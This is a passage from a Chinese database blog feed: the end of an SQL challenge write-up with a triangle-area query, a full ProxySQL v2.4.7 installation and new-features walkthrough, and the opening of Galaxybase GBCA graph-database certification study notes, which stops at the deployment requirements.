<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">  t.id, ROUND(<span class="number">0.5</span> <span class="operator">*</span> <span class="built_in">SQRT</span>(pow(a, <span class="number">2</span>) <span class="operator">+</span> pow(b, <span class="number">2</span>) <span class="operator">+</span> pow(c, <span class="number">2</span>)), <span class="number">2</span>) <span class="keyword">AS</span> area</span><br><span class="line"><span class="keyword">FROM</span> (</span><br><span class="line">  <span class="keyword">SELECT</span> triangle.id</span><br><span class="line">    , (p2.y <span class="operator">-</span> p1.y) <span class="operator">*</span> (p3.z <span class="operator">-</span> p1.z) <span class="operator">-</span> (p3.y <span class="operator">-</span> p1.y) <span class="operator">*</span> (p2.z <span class="operator">-</span> p1.z) <span class="keyword">AS</span> a</span><br><span class="line">    , (p2.z <span class="operator">-</span> p1.z) <span class="operator">*</span> (p3.x <span class="operator">-</span> p1.x) <span class="operator">-</span> (p2.x <span class="operator">-</span> p1.x) <span class="operator">*</span> (p3.z <span class="operator">-</span> p1.z) <span class="keyword">AS</span> b</span><br><span class="line">    , (p2.x <span class="operator">-</span> p1.x) <span class="operator">*</span> (p3.y <span class="operator">-</span> p1.y) <span class="operator">-</span> (p3.x <span class="operator">-</span> p1.x) <span class="operator">*</span> (p2.y <span class="operator">-</span> p1.y) <span class="keyword">AS</span> c</span><br><span class="line">  <span class="keyword">FROM</span> triangle</span><br><span class="line">    <span class="keyword">JOIN</span> point p1 <span class="keyword">ON</span> pointid1 <span class="operator">=</span> p1.id</span><br><span class="line">    <span class="keyword">JOIN</span> point p2 <span class="keyword">ON</span> pointid2 <span class="operator">=</span> p2.id</span><br><span class="line">    <span class="keyword">JOIN</span> point p3 <span class="keyword">ON</span> pointid3 <span class="operator">=</span> p3.id</span><br><span class="line">) t</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> t.id;</span><br></pre></td></tr></table></figure></div>
<p>这里用到了 MySQL 中的数学函数 <a class="link"   href="https://dev.mysql.com/doc/refman/8.0/en/mathematical-functions.html" >Mathematical Functions <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：<br>
SQRT: 返回非负数X的平方根。如果X为NULL，则该函数返回NULL。<br>
POW: 返回X的Y次方的值，如果X或Y为NULL则返回NULL。</p>
<h3 id="截图-3">截图</h3>
<img  alt="13.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230615-e50cf6ed-943d-4e11-9b27-1157c0c1ca2a.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="总结">总结</h2>
<p>三道题目各有侧重，题目都很有趣，对于不常写 SQL 的人来说很有难度，对于 MySQL 或者 AliSQL 不熟的人来说，也有一定的挑战。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a class="link"   href="https://www.modb.pro/db/636449" >阿里云瑶池数据库SQL挑战赛来袭！Beats耳机等好礼等你赢！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/647473" >https://www.modb.pro/db/647473 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>墨天轮</category>
      </categories>
      <tags>
        <tag>墨天轮</tag>
        <tag>aliyun</tag>
        <tag>sql优化</tag>
        <tag>rds</tag>
        <tag>serverless</tag>
      </tags>
  </entry>
  <entry>
    <title>ProxySQL v2.4.7 安装及新特性速览</title>
    <url>/2023/mysql/proxysql-v2.4.7-new-feature/</url>
    <content><![CDATA[<h2 id="导言">导言</h2>
<p>ProxySQL 是一个开源的高性能、高可用性、数据库协议感知的MySQL代理。</p>
<img  alt="proxysql_banner.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240302-cc9e56b7-9308-480c-9d7a-570eaf5f136e.png"
                      referrerpolicy="no-referrer"
                >
<p>ProxySQL v2.4.x 系列版本已经终结，最新版本为 v2.5.x 系列。</p>
<h2 id="安装-proxysql">安装 proxysql</h2>
<p>本文使用的 proxysql 版本为 2.4.7，系统为centos7，下载对应的rpm包然后进行安装。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/sysown/proxysql/releases/download/v2.4.7/proxysql-2.4.7-1-centos7.x86_64.rpm</span><br><span class="line">yum install proxysql-2.4.7-1-centos7.x86_64.rpm</span><br></pre></td></tr></table></figure></div>
<h2 id="启动-proxysql">启动 proxysql</h2>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">systemctl status proxysql</span></span><br><span class="line">* proxysql.service - High Performance Advanced Proxy for MySQL</span><br><span class="line">   Loaded: loaded (/etc/systemd/system/proxysql.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: inactive (dead)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo systemctl start proxysql</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">systemctl status proxysql</span></span><br><span class="line">* proxysql.service - High Performance Advanced Proxy for MySQL</span><br><span class="line">   Loaded: loaded (/etc/systemd/system/proxysql.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Tue 2023-06-13 10:31:21 JST; 3s ago</span><br><span class="line">  Process: 1894515 ExecStart=/usr/bin/proxysql --idle-threads -c /etc/proxysql.cnf $PROXYSQL_OPTS (code=exited, status=0/SUCCESS)</span><br><span class="line">Main PID: 1894517 (proxysql)</span><br><span class="line">    Tasks: 26</span><br><span class="line">   Memory: 13.2M</span><br><span class="line">   CGroup: /system.slice/proxysql.service</span><br><span class="line">           |-1894517 /usr/bin/proxysql --idle-threads -c /etc/proxysql.cnf</span><br><span class="line">           `-1894518 /usr/bin/proxysql --idle-threads -c /etc/proxysql.cnf</span><br></pre></td></tr></table></figure></div>
<p>启动后，可以看到有log输出：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">shawnyan@centos7:/var/lib/proxysql$ ll</span><br><span class="line">total 664</span><br><span class="line">-rw------- 1 proxysql proxysql      0 Jun 13 10:31 auditlog.log.00000001</span><br><span class="line">-rw-rw---- 1 proxysql proxysql   1082 Jun 13 10:31 proxysql-ca.pem</span><br><span class="line">-rw-rw---- 1 proxysql proxysql   1086 Jun 13 10:31 proxysql-cert.pem</span><br><span class="line">-rw-rw---- 1 proxysql proxysql   1679 Jun 13 10:31 proxysql-key.pem</span><br><span class="line">-rw------- 1 proxysql proxysql 208896 Jun 13 10:31 proxysql.db</span><br><span class="line">-rw------- 1 proxysql proxysql   5841 Jun 13 10:31 proxysql.log</span><br><span class="line">-rw-r--r-- 1 proxysql proxysql      8 Jun 13 10:31 proxysql.pid</span><br><span class="line">-rw------- 1 proxysql proxysql 184320 Jun 13 10:31 proxysql_stats.db</span><br><span class="line">-rw------- 1 proxysql proxysql      0 Jun 13 10:31 queries.log.00000001</span><br></pre></td></tr></table></figure></div>
<p>启动日志在文件proxysql.log中，输出查看如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">shawnyan@centos7:/var/lib/proxysql$ sudo cat proxysql.log</span><br><span class="line">2023-06-13 10:31:21 [INFO] ProxySQL version 2.4.7-5-gd467cc0</span><br><span class="line">2023-06-13 10:31:21 [INFO] Detected OS: Linux centos7.shawnyan.com 3.10.0-1127.19.1.el7.x86_64 #1 SMP Tue Aug 25 17:23:54 UTC 2020 x86_64</span><br><span class="line">2023-06-13 10:31:21 [INFO] ProxySQL SHA1 checksum: 59b0a2dce1059598a526a8fbac0a807912746a90</span><br><span class="line">2023-06-13 10:31:21 [INFO] Starting ProxySQL</span><br><span class="line">2023-06-13 10:31:21 [INFO] Successfully started</span><br><span class="line">2023-06-13 10:31:21 [INFO] Angel process started ProxySQL process 1894518</span><br><span class="line">2023-06-13 10:31:21 [INFO] Loaded built-in SQLite3</span><br><span class="line">Standard ProxySQL MySQL Logger rev. 2.0.0714 -- MySQL_Logger.cpp -- Wed Jan 18 11:36:24 2023</span><br><span class="line">Standard ProxySQL Cluster rev. 0.4.0906 -- ProxySQL_Cluster.cpp -- Wed Jan 18 11:36:24 2023</span><br><span class="line">Standard ProxySQL Statistics rev. 1.4.1027 -- ProxySQL_Statistics.cpp -- Wed Jan 18 11:36:24 2023</span><br><span class="line">Standard ProxySQL HTTP Server Handler rev. 1.4.1031 -- ProxySQL_HTTP_Server.cpp -- Wed Jan 18 11:36:24 2023</span><br><span class="line">2023-06-13 10:31:21 [INFO] Using UUID: 28a7d839-4b4d-403d-b1e1-1f35f8207714 , randomly generated. Writing it to database</span><br><span class="line">2023-06-13 10:31:21 [INFO] Computed checksum for &#x27;LOAD ADMIN VARIABLES TO RUNTIME&#x27; was &#x27;0xA4565F5D560FB2E0&#x27;, with epoch &#x27;1686619881&#x27;</span><br><span class="line">2023-06-13 10:31:21 [INFO] Switching query logging format from 1 to 2</span><br><span class="line">2023-06-13 10:31:21 ProxySQL_Admin.cpp:6921:flush_mysql_variables___database_to_runtime(): [ERROR] Found incompatible values for mysql-default_charset (utf8mb4) and mysql-default_collation_connection (utf8_general_ci)</span><br><span class="line">2023-06-13 10:31:21 [INFO] Changing mysql-default_collation_connection to utf8mb4_general_ci using configured mysql-default_charset: utf8mb4</span><br><span class="line">2023-06-13 10:31:21 [INFO] Computed checksum for &#x27;LOAD MYSQL VARIABLES TO RUNTIME&#x27; was &#x27;0xED346CC5B472E7DB&#x27;, with epoch &#x27;1686619881&#x27;</span><br><span class="line">Standard ProxySQL Admin rev. 2.0.6.0805 -- ProxySQL_Admin.cpp -- Wed Jan 18 11:36:24 2023</span><br><span class="line">2023-06-13 10:31:21 [INFO] ProxySQL SHA1 checksum: 59b0a2dce1059598a526a8fbac0a807912746a90</span><br><span class="line">Standard MySQL Threads Handler rev. 0.2.0902 -- MySQL_Thread.cpp -- Wed Jan 18 11:36:24 2023</span><br><span class="line">Standard MySQL Authentication rev. 0.2.0902 -- MySQL_Authentication.cpp -- Wed Jan 18 11:36:24 2023</span><br><span class="line">2023-06-13 10:31:21 [INFO] Computed checksum for &#x27;LOAD MYSQL USERS TO RUNTIME&#x27; was &#x27;0x0000000000000000&#x27;, with epoch &#x27;1686619881&#x27;</span><br><span class="line">2023-06-13 10:31:21 [INFO] Dumping mysql_servers_incoming</span><br><span class="line">+--------------+----------+------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| hostgroup_id | hostname | port | gtid_port | weight | status | compression | max_connections | max_replication_lag | use_ssl | max_latency_ms | comment |</span><br><span class="line">+--------------+----------+------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">+--------------+----------+------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">2023-06-13 10:31:21 [INFO] Dumping mysql_servers LEFT JOIN mysql_servers_incoming</span><br><span class="line">+-------------+--------------+----------+------+</span><br><span class="line">| mem_pointer | hostgroup_id | hostname | port |</span><br><span class="line">+-------------+--------------+----------+------+</span><br><span class="line">+-------------+--------------+----------+------+</span><br><span class="line">2023-06-13 10:31:21 [INFO] Dumping mysql_servers JOIN mysql_servers_incoming</span><br><span class="line">+--------------+----------+------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+-------------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| hostgroup_id | hostname | port | gtid_port | weight | status | compression | max_connections | max_replication_lag | use_ssl | max_latency_ms | comment | mem_pointer | gtid_port | weight | status | compression | max_connections | max_replication_lag | use_ssl | max_latency_ms | comment |</span><br><span class="line">+--------------+----------+------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+-------------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">+--------------+----------+------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+-------------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">2023-06-13 10:31:21 [INFO] New mysql_group_replication_hostgroups table</span><br><span class="line">2023-06-13 10:31:21 [INFO] New mysql_galera_hostgroups table</span><br><span class="line">2023-06-13 10:31:21 [INFO] New mysql_aws_aurora_hostgroups table</span><br><span class="line">2023-06-13 10:31:21 [INFO] MySQL_HostGroups_Manager::commit() locked for 2ms</span><br><span class="line">2023-06-13 10:31:21 [INFO] Computed checksum for &#x27;LOAD PROXYSQL SERVERS TO RUNTIME&#x27; was &#x27;0x0000000000000000&#x27;, with epoch &#x27;1686619881&#x27;</span><br><span class="line">Standard Query Processor rev. 2.0.6.0805 -- Query_Processor.cpp -- Wed Jan 18 11:36:24 2023</span><br><span class="line">2023-06-13 10:31:21 [INFO] Computed checksum for &#x27;LOAD MYSQL QUERY RULES TO RUNTIME&#x27; was &#x27;0x0000000000000000&#x27;, with epoch &#x27;1686619881&#x27;</span><br><span class="line">In memory Standard Query Cache (SQC) rev. 1.2.0905 -- Query_Cache.cpp -- Wed Jan 18 11:36:24 2023</span><br><span class="line">2023-06-13 10:31:21 [INFO] Starting new mysql event log file /var/lib/proxysql/queries.log.00000001</span><br><span class="line">2023-06-13 10:31:21 [INFO] Starting new audit log file /var/lib/proxysql/auditlog.log.00000001</span><br><span class="line">Standard MySQL Monitor (StdMyMon) rev. 2.0.1226 -- MySQL_Monitor.cpp -- Wed Jan 18 11:36:24 2023</span><br><span class="line">2023-06-13 10:31:21 [INFO] For information about products and services visit: https://proxysql.com/</span><br><span class="line">2023-06-13 10:31:21 [INFO] For online documentation visit: https://proxysql.com/documentation/</span><br><span class="line">2023-06-13 10:31:21 [INFO] For support visit: https://proxysql.com/services/support/</span><br><span class="line">2023-06-13 10:31:21 [INFO] For consultancy visit: https://proxysql.com/services/consulting/</span><br></pre></td></tr></table></figure></div>
<h2 id="连接-proxysql">连接 proxysql</h2>
<p>proxysql 的管理端口为 6032，可以像正常访问 mariadb 一样访问 proxysql，并查询版本号。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">shawnyan@centos7:/var/lib/proxysql$ mysql -u admin -padmin -h 127.0.0.1 -P6032 --prompt=&#x27;Admin&gt; &#x27;</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 1</span><br><span class="line">Server version: 5.5.30 (ProxySQL Admin Module)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">Admin&gt; </span><span class="language-bash"><span class="keyword">select</span> version();</span></span><br><span class="line">+------------------+</span><br><span class="line">| version()        |</span><br><span class="line">+------------------+</span><br><span class="line">| 2.4.7-5-gd467cc0 |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">Admin&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>从日志中可以看到，这是第一次登陆管理端口，版本号为 <code>2.4.7-5-gd467cc0</code>。</p>
<h2 id="新特性">新特性</h2>
<p>下面介绍从 proxysql 2.4 引入的新特性。</p>
<h3 id="1-新参数-mysql-unshun-algorithm">1. 新参数 <code>mysql-unshun_algorithm</code></h3>
<p>从 proxysql 2.4.0 开始，引入了新的变量 <code>mysql-unshun_algorithm</code>。 它控制是否只在发送流量的主机组上执行自动取消主机回避，还是在主机存在的所有主机组上执行自动取消主机回避。</p>
<p>该参数有两个值，0和1. 默认值为0.</p>
<p>0：默认行为，只有来自主机组的服务器处理流量是不回避的。<br>
1：当一个服务器在一个特定的主机组中不被回避时，它在所有其他主机组中也不被回避。</p>
<p>设定方式：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> global_variables <span class="keyword">where</span> variable_name <span class="operator">=</span> <span class="string">&#x27;mysql-unshun_algorithm&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span> mysql<span class="operator">-</span>unshun_algorithm<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">LOAD MYSQL VARIABLES <span class="keyword">TO</span> RUNTIME;</span><br></pre></td></tr></table></figure></div>
<p>更改设定后，日志输出：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2023-06-13 11:48:06 [INFO] Received command SET mysql-unshun_algorithm=&#x27;1&#x27;</span><br><span class="line">2023-06-13 11:48:08 [INFO] Received LOAD MYSQL VARIABLES TO RUNTIME command</span><br><span class="line">2023-06-13 11:48:08 [INFO] Computed checksum for &#x27;LOAD MYSQL VARIABLES TO RUNTIME&#x27; was &#x27;0x1047DB032DEBE347&#x27;, with epoch &#x27;1686624488&#x27;</span><br></pre></td></tr></table></figure></div>
<h3 id="2-支持命令-COM-RESET-CONNECTION">2. 支持命令 <code>COM_RESET_CONNECTION</code></h3>
<p>从 proxysql 2.4.0 开始，支持命令 <code>COM_RESET_CONNECTION</code>。该命令对应 mysql 客户端 api 的 <code>mysql_reset_connection()</code>。</p>
<p><code>mysql_reset_connection()</code> 的作用类似于 <code>mysql_change_user()</code> 或自动重新连接，除了连接不关闭和重新打开，并且不进行重新认证。</p>
<p>执行该命令的影响如下：</p>
<ul>
<li>回滚所有活动事务并重置自动提交模式。</li>
<li>释放所有表锁。</li>
<li>关闭(和删除)所有TEMPORARY表。</li>
<li>将会话系统变量重新初始化为相应的全局系统变量的值，包括由诸如set NAMES之类的语句隐式设置的系统变量。</li>
<li>丢失用户定义的变量设置。</li>
<li>释放准备好的语句。</li>
<li>关闭HANDLER变量。</li>
<li>将LAST_INSERT_ID()的值重置为0。</li>
<li>释放通过GET_LOCK()获取的锁。</li>
</ul>
<h3 id="3-新参数-mysql-query-digests-keep-comment">3. 新参数 <code>mysql-query_digests_keep_comment</code></h3>
<p>添加了新的配置变量 <code>mysql-query_digests_keep_comment</code>:启用后，不会从查询摘要中删除 <code>/* */</code> 类型的注释。</p>
<p>设定方式：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> mysql<span class="operator">-</span>query_digests_keep_comment<span class="operator">=</span><span class="string">&#x27;true&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
<p>设定后，演示如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">Admin<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> stats_mysql_query_digest;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+--------------------+----------+----------------+--------------------+-----------------------------------------------------------------------------------------------------------------------------+------------+------------+------------+----------+----------+----------+-------------------+---------------+</span></span><br><span class="line"><span class="operator">|</span> hostgroup <span class="operator">|</span> schemaname         <span class="operator">|</span> username <span class="operator">|</span> client_address <span class="operator">|</span> digest             <span class="operator">|</span> digest_text                                                                                                                 <span class="operator">|</span> count_star <span class="operator">|</span> first_seen <span class="operator">|</span> last_seen  <span class="operator">|</span> sum_time <span class="operator">|</span> min_time <span class="operator">|</span> max_time <span class="operator">|</span> sum_rows_affected <span class="operator">|</span> sum_rows_sent <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+--------------------+----------+----------------+--------------------+-----------------------------------------------------------------------------------------------------------------------------+------------+------------+------------+----------+----------+----------+-------------------+---------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0</span>         <span class="operator">|</span> information_schema <span class="operator">|</span> sbtest   <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">0x5E0FFD01059F91D0</span> <span class="operator">|</span> <span class="keyword">SELECT</span> <span class="comment">/* ;create_new_connection=1 */</span> <span class="built_in">lower</span>(variable_name),variable_value <span class="keyword">FROM</span> information_schema.SESSION_VARIABLES limit ? <span class="operator">|</span> <span class="number">1</span>          <span class="operator">|</span> <span class="number">1686632838</span> <span class="operator">|</span> <span class="number">1686632838</span> <span class="operator">|</span> <span class="number">13536</span>    <span class="operator">|</span> <span class="number">13536</span>    <span class="operator">|</span> <span class="number">13536</span>    <span class="operator">|</span> <span class="number">0</span>                 <span class="operator">|</span> <span class="number">1</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0</span>         <span class="operator">|</span> information_schema <span class="operator">|</span> sbtest   <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">0x226CD90D52A2BA0B</span> <span class="operator">|</span> <span class="keyword">select</span> @<span class="variable">@version_comment</span> limit ?                                                                                            <span class="operator">|</span> <span class="number">1</span>          <span class="operator">|</span> <span class="number">1686632835</span> <span class="operator">|</span> <span class="number">1686632835</span> <span class="operator">|</span> <span class="number">0</span>        <span class="operator">|</span> <span class="number">0</span>        <span class="operator">|</span> <span class="number">0</span>        <span class="operator">|</span> <span class="number">0</span>                 <span class="operator">|</span> <span class="number">0</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+--------------------+----------+----------------+--------------------+-----------------------------------------------------------------------------------------------------------------------------+------------+------------+------------+----------+----------+----------+-------------------+---------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.008</span> sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="4-支持内置方法-current-user-和-user">4. 支持内置方法 <code>current_user()</code> 和 <code>user()</code></h3>
<p>在 proxysql admin 管理界面，新增两种内置方法，支持查询用户信息。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">Admin<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">current_user</span>();</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">current_user</span>()  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> admin<span class="variable">@127</span><span class="number">.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">Admin<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span>();</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>()          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> admin<span class="variable">@127</span><span class="number">.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.000</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>注：在 MySQL 中使用 <code>current_user</code> 函数可以在连接到 MySQL 时获得实际验证过的用户名和主机名。 另外，当你连接到MySQL时，使用USER函数可以获得你指定的用户名和主机名。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MySQL [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span>();</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>()         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="operator">|</span> sbtest<span class="variable">@centos7</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MySQL [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">current_user</span>();</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">current_user</span>() <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="operator">|</span> sbtest@<span class="operator">%</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="总结">总结</h2>
<p>本文综述了 ProxySQL v2.4.x 新版本的安装及使用，并重点强调了其中的4个新特性。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>ProxySQL</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>mysql</tag>
        <tag>proxysql</tag>
      </tags>
  </entry>
  <entry>
    <title>GBCA (Galaxybase) 认证学习资料内参</title>
    <url>/2023/other/galaxybase-gbca/</url>
    <content><![CDATA[<h2 id="创邻科技-Galaxybase-图数据库">创邻科技 Galaxybase 图数据库</h2>
<p>Galaxybase是中国自主知识产权的通用商业化分布式图数据库，目前世界最快、延展性最好，性能超美国同类竞品百倍。Galaxybase改变了传统数据存储的方式，以一种更为灵活的基于“对象”和其间“关系”的图数据结构，将分散的不同种类的原始数据连接在一起形成一个关系网络，打通数据孤岛，通过自然语言处理、机器学习、图挖掘等人工智能算法，提供用户从关系角度分析问题的能力，帮助其完成实时决策。</p>
<h2 id="Galaxybase-图数据库认证专员（GBCA）">Galaxybase 图数据库认证专员（GBCA）</h2>
<p>Galaxybase 图数据库认证专员（GBCA）是创邻科技 Galaxybase 培训体系初级认证课程。未来将持续推出 Galaxybase 图数据库认证专家（GBCP）和认证大师（GBCM）的中高级进阶课程，该认证体系凝聚了图数据库王牌厂商创邻科技近十年实践经验，致力于帮助企业和个人更轻松、更快速、更深入地学习系统的图数据库理论知识和实操方法，全面掌握面向关联复杂、变化迅速、查询频繁场景的图技术处理方案，实现企业从“数据管理”到“数据驱动”的关键数字化转型。</p>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230620-d7bbf9b7-c168-44cd-a0cc-92f089842444.png"
                      referrerpolicy="no-referrer"
                >
图 -- 新鲜出炉的 GBCA 证书
<h2 id="数据库基础概念">数据库基础概念</h2>
<ul>
<li>数据模型 Data Model</li>
</ul>
<p>数据模型是用于描述数据库中数据结构的描述。</p>
<blockquote>
<p>A data model is collection of concepts for describing the data in a database，A description of how the data is structured.<br>
—— Professor Andy Pavlo, Carnegie Mellon, University</p>
</blockquote>
<p>按模型可分为关系模型，图模型，键值模型，文档模型，宽列模型。</p>
<ul>
<li>图的定义</li>
</ul>
<p>图是由若干给定的顶点及连接两顶点的边所构成的图形<br>
图通常用来描述某些事物之间的某种特定关系<br>
顶点用于代表事物，连接两顶点的边则用于表示两个事物间具有某种关系。</p>
<ul>
<li>图数据库的定义</li>
</ul>
<p>以点、边为基础存储单元，以高效存储、查询图数据为第一设计原理的数据管理系统。</p>
<img  alt="2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230612-9843f3d3-8d03-47a4-9979-1949f86e5303.png"
                      referrerpolicy="no-referrer"
                >
图1 - 墨天轮图数据库排行榜 Top 10
<ul>
<li>属性图</li>
</ul>
<p>属性图模型由顶点、边及其属性构成。顶点和边都可以带有属性，节点可以通过“标签（Label）”进行分组。表示关系的边总是从一个开始点指向一个结束点，而且边是一定是有方向的，这使得图成为了有向图。关系上的属性可以为节点的关系提供额外的元数据和语义。是业界最通用的图模型。</p>
<h2 id="图数据库的特性">图数据库的特性</h2>
<p>图数据库按存储架构可分为非原生图数据库，原生图数据库。</p>
<ul>
<li>非原生图数据库</li>
</ul>
<ol>
<li>关系型数据库缺少关系数据，只有在建模阶段作为连接表的手段</li>
<li>关系型数据库无法对关系进行语义区分，以及定义权重</li>
<li>关联查询代价昂贵</li>
</ol>
<ul>
<li>原生图数据库</li>
</ul>
<ol>
<li>图数据库把关系作为数据的一部分进行存储</li>
<li>图数据库可以对关系进行语义区分，定义权重</li>
<li>高效查询复杂关系</li>
</ol>
<h2 id="图数据库的应用场景">图数据库的应用场景</h2>
<p>图数据库的应用场景广泛，数据库规模大，关联跳数深，实时要求高的场景都适合使用图数据库。<br>
比如：社交网络，金融，零售，电力，电信，政企，制造，网络安全等。</p>
<h2 id="Galaxybase-单机版部署环境">Galaxybase 单机版部署环境</h2>
<ol>
<li>centos 7+</li>
